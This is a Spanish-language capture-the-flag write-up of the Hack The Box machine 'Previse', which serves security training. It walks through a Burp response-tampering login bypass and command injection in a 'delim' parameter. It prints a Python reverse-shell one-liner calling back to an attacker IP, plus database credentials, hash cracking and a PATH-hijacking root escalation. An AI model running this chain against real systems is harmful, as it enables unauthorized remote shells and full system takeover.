---
layout: single
title: Previse - Hack The Box
excerpt: "En esta máquina fácil de HTB, empezamos con un panel de login, en el cual logramos ingresar luego de haber registrado un usuario, forzando con Burpsuite un 200 Ok en la respuesta del servidor, para luego inyectar un comando en un parametro vulnerable de la web, con el que conseguimos RCE, nos conectamos a una base de datos de mysql con credenciales previamente encontradas, extraemos el hash de un usuario válido del sistema, lo crackeamos y nos conectamos con ssh para posteriormente efectuar un Path-Hijacking con un script que podemos ejecutar como el usuario root, logrando así escalar privilegios máximos"
date: 2022-01-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-previse/Previse.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - writeup
tags:
  - linux
  - web
  - fuzzing
  - mysql
  - path hijacking
---

<p align="center">
<img src="/assets/images/htb-writeup-previse/img_header.png">
</p>

Iniciamos con un escaneo básico de puertos con **nmap**

```bash
~$> sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.104
```
 - ```-p-``` -> Todo el rango de puertos (**1-65535**)
 - ```-sS``` -> TCP SYN/PORT scan
 - ```--min-rate``` -> Mínimo de paquetes que quiero que se emitan por segundo (**5000**)
 - ```--open``` -> Mostrar solo puertos abiertos
 - ```-vvv``` -> Triple verbose para ver los avances del escaneo antes de que acabe
 - ```-n``` -> Quitar la resolución DNS
 - ```-Pn``` -> Para no aplicar host discovery

<p align="center">
<img src="/assets/images/htb-writeup-previse/nmap.png">
</p>

Vemos que hay **2** puertos externamente visibles:

  - ```80``` -> http
  - ```22``` -> ssh

Conociendo que hay un servicio web **http** corriendo, vamos a verlo desde el navegador

<p align="center">
<img src="/assets/images/htb-writeup-previse/img1.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-previse/img2.png">
</p>



Despues de probar algunas inyecciones de diferentes tipos contra el panel de login, ninguna funcionaba, por lo que apliqué **fuzzing** con **wfuzz** en busqueda de archivos **.php**

```bash
~$> wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.104/FUZZ.php
```

  - ```-c``` -> Formato **colorizado**
  - ```--hc``` -> **Ocultando** las respuestas con el **código** de estado **404**
  - ```-w``` -> Wordlist
  - ```FUZZ``` -> Lugar donde se aplicara el **fuzzing**

Encontrando lo siguiente:

<p align="center">
<img src="/assets/images/htb-writeup-previse/wfuzz.png">
</p>

Si nos dirigimos al **nav.php** en el navegador, vemos un panel de navegación con algunas opciones interesantes

<p align="center">
<img src="/assets/images/htb-writeup-previse/img3.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-previse/img4.png">
</p>

Pero si intentamos entrar en alguna de estas secciones, el servidor nos redirige al panel de login, por lo que viendo esto se me ocurrió abrir el Burpsuite para interceptar la petición e intentar forzar un código de estado ```200 Ok```

 - Primero definimos el scope:
> Esto para que no intercepte peticiones de sitios diferentes al que queremos

<p align="center">
<img src="/assets/images/htb-writeup-previse/img5.png">
</p>

 - Despues de esto y con el **intercept on**, interceptamos la petición de **create account**

<p align="center">
<img src="/assets/images/htb-writeup-previse/img6.png">
</p>

 - Configuramos el Burpsuite para poder modificar la respuesta, para posteriormente enviarla

<p align="center">
<img src="/assets/images/htb-writeup-previse/img7.png">
</p>

 - Seguimos la petición en forward

<p align="center">
<img src="/assets/images/htb-writeup-previse/forward.png">
</p>

 - Cambiamos el ```302 Found``` por un ```200 Ok```

<p align="center">
<img src="/assets/images/htb-writeup-previse/img8.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-previse/img9.png">
</p>

Luego de esto podemos ver como en la web se nos dirige a un portal donde podemos crear un usuario, así que creamos uno

<p align="center">
<img src="/assets/images/htb-writeup-previse/img10.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-previse/img11.png">
</p>

Y vemos que se nos redirige nuevamente al panel de login del inicio, entonces ingresamos el usuario creado previamente

<p align="center">
<img src="/assets/images/htb-writeup-previse/img12.png">
</p>

Y entramos!

<p align="center">
<img src="/assets/images/htb-writeup-previse/img13.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-previse/img14.png">
</p>

Una vez dentro, nos dirigimos al apartado de **files** y descargamos el ```SITEBACKUP.ZIP``` que encontramos ahí

<p align="center">
<img src="/assets/images/htb-writeup-previse/img15.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-previse/img16.png">
</p>

Lo descomprimimos

```bash
~$> unzip siteBackup.zip
```
<p align="center">
<img src="/assets/images/htb-writeup-previse/unzip.png">
</p>

Aquí encontramos varios ficheros de los cuales uno es un ```config.php``` el cual contiene credenciales para la base de datos

```bash
~$> cat config.php
```
<p align="center">
<img src="/assets/images/htb-writeup-previse/config.png">
</p>

Además de este archivo de configuración, encontramos un ```logs.php``` con información interesante

```bash
~$> cat logs.php
```
<p align="center">
<img src="/assets/images/htb-writeup-previse/logs.png">
</p>

En este script podemos ver que con ```python``` se ejecuta un script (```log_process.py```) el cual necesita de un argumento que recibe por medio del parametro ```delim``` por el cual podríamos inyectar algún comando

 - Vamos a ```LOG DATA```

<p align="center">
<img src="/assets/images/htb-writeup-previse/img17.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-previse/img18.png">
</p>


 - Damos a ```SUBMIT``` e interceptamos la petición, nuevamente con Burpsuite

<p align="center">
<img src="/assets/images/htb-writeup-previse/img19.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-previse/img20.png">
</p>

 - Identificamos el campo vulnerable que previamente habíamos encontrado (```delim```)

<p align="center">
<img src="/assets/images/htb-writeup-previse/img21.png">
</p>

 - Como vimos antes, este parametro no está bien sanitizado en el código, por lo que podemos inyectar una instrucción usando un ```;``` de la siguiente manera:

<p align="center">
<img src="/assets/images/htb-writeup-previse/img22.png">
</p>

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[TU_IP]",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
De esta manera nos podremos enviar una shell a nuestro equípo por el puerto 443, así que nos ponemos en escucha con ```netcat``` antes de enviar la respuesta

```bash
~$> nc -nlvp 443
```
Damos en forward

<p align="center">
<img src="/assets/images/htb-writeup-previse/forward.png">
</p>

Y vemos nuestro listener

<p align="center">
<img src="/assets/images/htb-writeup-previse/nc.png">
</p>

Luego de hacer un [tratamiento de la tty](https://invertebr4do.github.io/tratamiento-de-tty), recordé las credenciales que habíamos encontrado previamente en el archivo ```config.php```, así que me conecté con mysql

```bash
www-data@previse:/var/www/html$ mysql -uroot -pmySQL_p@ssw0rd\!:\)
```
<p align="center">
<img src="/assets/images/htb-writeup-previse/mysql.png">
</p>

Listamos las bases de datos

```bash
mysql> show databases;
```
<p align="center">
<img src="/assets/images/htb-writeup-previse/db.png">
</p>

Y vemos una con nombre ```previse```, la seleccionamos

```bash
mysql> use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Si listamos las tablas

```bash
mysql> show tables;
```
<p align="center">
<img src="/assets/images/htb-writeup-previse/tables.png">
</p>

Encontramos una interesante (```accounts```), listamos el contenido

```bash
mysql> select * from accounts;
```
<p align="center"> 
<img src="/assets/images/htb-writeup-previse/fields.png">
</p>

De esta forma logramos ver dos hashes, el del usuario que registramos en el inicio y el de ```**m4lwhere**```

Así que guardamos el primer hash en un fichero en nuestra máquina para despues crackearlo, en mi caso con ```john```

```bash
~$> john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=md5crypt-long
```
<p align="center">
<img src="/assets/images/htb-writeup-previse/john.png">
</p>

Y despúes de un rato, obtenemos una contraseña la cual nos sirve para conectarnos por ssh

```bash
~$> ssh m4lwhere@10.10.11.104
m4lwhere@10.10.11.104's password:
```
<p align="center">
<img src="/assets/images/htb-writeup-previse/ssh.png">
</p>

Vemos si podemos hacer algo como otro usuario del sistema

```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```
Y encontramos un script que podemos ejecutar como el usuario ```root```

Si lo leemos

```bash
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
```
<p align="center">
<img src="/assets/images/htb-writeup-previse/gzip.png">
</p>

Podemos rápidamente darnos cuenta de que se está llamando a el comando ```gzip``` de forma relativa, por lo que ya sabemos que podemos hacer un **Path Hijacking** para obtener el root

 - Primero ejecutamos el siguiente comando para insertar la instrucción que convertira la ```/bin/bash``` en **SUID**, dentro de un fichero que se llame ```gzip```

```bash
m4lwhere@previse:~$ echo -e "#\!/bin/bash\nchmod 4755 /bin/bash" > gzip
```
 - Le asignamos permisos de ejecución al fichero que acabamos de crear

```bash
m4lwhere@previse:~$ chmod +x gzip
```
 - Alteramos el path, para que en lugar de empezar buscando el binario ```gzip``` en ```/usr/local/sbin```, use el que acabamos de crear en el directorio actual, esto de la siguiente forma:

```bash
m4lwhere@previse:~$ export PATH=.:$PATH
```
 - Y ejecutamos el script como el usuario ```root```

```bash
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
```
Por último ejecutamos una bash atendiendo al permiso **SUID** que se le acaba de asignar

```bash
m4lwhere@previse:~$ bash -p
bash-4.4#
```
Y ahora somos root

```bash
bash-4.4# whoami
root
```

**:>**
